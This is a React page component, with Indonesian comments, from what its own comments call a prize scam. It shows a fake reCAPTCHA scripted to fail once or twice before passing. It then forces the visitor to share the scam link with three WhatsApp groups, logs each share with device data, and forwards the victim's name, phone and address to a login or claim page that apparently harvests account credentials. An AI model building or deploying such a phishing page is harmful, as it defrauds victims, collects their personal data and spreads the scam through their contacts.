import { useRef, useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import Steps from "./Steps";
import { getPrize } from "../prizes";
import { playFail, playDing, playPop, playClick } from "../sound";
import { detectDevice } from "../device";
import { sendSubmission } from "../store";

const buzz = (ms = 60) => navigator.vibrate?.(ms);

const VerifyPage = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { prize = "Hadiah", nama = "", hp = "", alamat = "" } = location.state || {};

  // CAPTCHA state: idle -> checking -> failed -> success
  const [captchaState, setCaptchaState] = useState("idle");
  const [shares, setShares] = useState([false, false, false]);
  // Skrip skenarionya: gagal 1-2x (acak) lalu pasti berhasil
  const failsNeeded = useRef(Math.random() < 0.5 ? 1 : 2);
  const attempts = useRef(0);

  const captchaDone = captchaState === "success";
  const sharesDone = shares.filter(Boolean).length;
  const allShared = sharesDone === 3;
  const canContinue = captchaDone && allShared;

  const runCaptcha = () => {
    if (captchaState === "checking" || captchaDone) return;
    buzz(40);
    setCaptchaState("checking");
    setTimeout(() => {
      attempts.current += 1;
      if (attempts.current >= failsNeeded.current) {
        setCaptchaState("success");
        playDing();
        navigator.vibrate?.([50, 40, 50]);
      } else {
        setCaptchaState("failed");
        playFail();
        buzz(120);
      }
    }, 1600);
  };

  const doShare = (i) => {
    if (shares[i]) return;
    buzz(50);
    playPop();
    setShares((prev) => prev.map((v, idx) => (idx === i ? true : v)));

    // Catat juga: korban "membantu" menyebarkan link penipuan
    sendSubmission({
      tipe: "share",
      target: `Grup/Teman #${i + 1}`,
      prize,
      perangkat: detectDevice(),
    });
  };

  return (
    <div className="min-h-screen" style={{ background: "radial-gradient(120% 100% at 50% 0%, #241333 0%, #0b0b14 55%)" }}>
      <div className="container flex flex-col justify-center" style={{ maxWidth: 480, minHeight: "100vh", padding: "26px 16px 40px" }}>
        <Steps current={2} />

        <h2 style={{ fontWeight: 800, fontSize: 19, textAlign: "center" }}>
          Verifikasi Diperlukan 🔐
        </h2>
        <p style={{ fontSize: 12.5, color: "#8b93a7", textAlign: "center", margin: "6px 0 18px", lineHeight: 1.55 }}>
          Hadiah <strong style={{ color: "#ffd166" }}>{prize}</strong> siap dikirim.<br />
          Selesaikan 2 verifikasi cepat di bawah ini:
        </p>

        {/* Panel 1: Captcha */}
        <div className="panel" style={{ padding: 16, marginBottom: 12 }}>
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 11 }}>
            <span style={{ fontWeight: 700, fontSize: 13.5 }}>1 · Verifikasi Manusia</span>
            {captchaDone && <span style={{ color: "#4ade80", fontSize: 12, fontWeight: 700 }}>✔ Lolos</span>}
          </div>

          <div
            onClick={runCaptcha}
            className={`captcha-box ${captchaState === "failed" ? "shake" : ""}`}
            style={
              captchaDone
                ? { borderColor: "#22c55e", background: "#f0fdf4" }
                : captchaState === "failed"
                ? { borderColor: "#dc2626" }
                : {}
            }
          >
            <div className="captcha-check">
              {captchaState === "checking" && <div className="spinner" />}
              {captchaDone && <span style={{ color: "#16a34a" }}>✓</span>}
            </div>
            <div style={{ fontSize: 13.5, fontWeight: 600 }}>
              {captchaState === "checking"
                ? "Memverifikasi..."
                : captchaDone
                ? "Verifikasi Berhasil!"
                : "Saya bukan robot"}
            </div>
            {!captchaDone && (
              <div className="captcha-brand">
                reCAPTCHA<br />Privacy · Terms
              </div>
            )}
          </div>

          {captchaState === "failed" && (
            <div style={{ color: "#f87171", fontSize: 11.5, marginTop: 8, fontWeight: 600 }}>
              ⚠ Verifikasi gagal — server sibuk. Silakan coba lagi!
            </div>
          )}
          {captchaDone && (
            <div style={{ color: "#15803d", fontSize: 11.5, marginTop: 8, fontWeight: 700 }}>
              ✔ Identitas terkonfirmasi sebagai manusia · Sesi aman selama 30 menit
            </div>
          )}
        </div>

        {/* Panel 2: Share */}
        <div className="panel" style={{ padding: 16, marginBottom: 18 }}>
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 5 }}>
            <span style={{ fontWeight: 700, fontSize: 13.5 }}>2 · Bagikan Event</span>
            <span style={{ color: sharesDone === 3 ? "#4ade80" : "#ffb020", fontSize: 12, fontWeight: 700 }}>
              {sharesDone}/3 selesai
            </span>
          </div>
          <p style={{ fontSize: 11.5, color: "#8b93a7", marginBottom: 14, lineHeight: 1.5 }}>
            Bagikan link event ke <strong>3 grup / teman WhatsApp</strong> untuk membuka tombol klaim.
            Ini wajib agar sistem memvalidasi kamu bukan bot.
          </p>

          <div className="share-row">
            {[0, 1, 2].map((i) => (
              <button key={i} className={`share-dot ${shares[i] ? "done" : ""}`} onClick={() => doShare(i)}>
                <span style={{ fontSize: 20 }}>{shares[i] ? "✔" : "💬"}</span>
                {shares[i] ? "Terkirim" : `Grup ${i + 1}`}
              </button>
            ))}
          </div>

          {!allShared && (
            <div style={{ textAlign: "center", marginTop: 13 }}>
              <button
                onClick={() => shares.forEach((s, i) => !s && doShare(i))}
                style={{
                  background: "none",
                  border: "none",
                  color: "#25d366",
                  fontWeight: 700,
                  fontSize: 12.5,
                  cursor: "pointer",
                  textDecoration: "underline",
                }}
              >
                Buka WhatsApp & bagikan sekarang →
              </button>
            </div>
          )}
        </div>

        <button
          className="btn-cta"
          disabled={!canContinue}
          onClick={() => {
            playClick();
            // Hadiah game → login akun game; hadiah lain → verifikasi sesuai jenisnya
            const dest = getPrize(prize).type === "game" ? "/login" : "/claim";
            navigate(dest, { state: { prize, nama, hp, alamat } });
          }}
          style={{ width: "100%", opacity: canContinue ? 1 : 0.35 }}
        >
          {canContinue ? "VERIFIKASI →" : `SELESAIKAN VERIFIKASI (${(captchaDone ? 1 : 0) + sharesDone}/4)`}
        </button>

        <p style={{ textAlign: "center", marginTop: 13, fontSize: 10.5, color: "#4a5165" }}>
          © 2026 Reward Center International Ltd.
        </p>
      </div>
    </div>
  );
};

export default VerifyPage;
